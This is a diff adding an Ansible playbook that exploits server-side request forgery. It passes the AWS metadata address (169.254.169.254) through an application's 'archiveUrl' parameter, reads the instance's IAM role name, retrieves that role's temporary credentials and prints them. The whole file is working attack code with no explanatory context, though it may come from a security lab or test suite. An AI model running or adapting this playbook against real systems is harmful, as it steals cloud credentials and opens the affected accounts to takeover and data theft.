@@ -1,0 +1,16 @@
+- hosts: all
+  gather_facts: false
+  tasks:
+  - name: get role name
+    ansible.builtin.uri:
+      url: "{{ app_url }}/api/archives?archiveUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      return_content: true
+    register: role_name
+  - name: get creds
+    ansible.builtin.uri:
+      url: "{{ app_url }}/api/archives?archiveUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/{{ role_name['content'] }}"
+      return_content: true
+    register: creds
+  - name: Print creds
+    ansible.builtin.debug:
+      msg: "{{ creds['content'] | from_json }}"
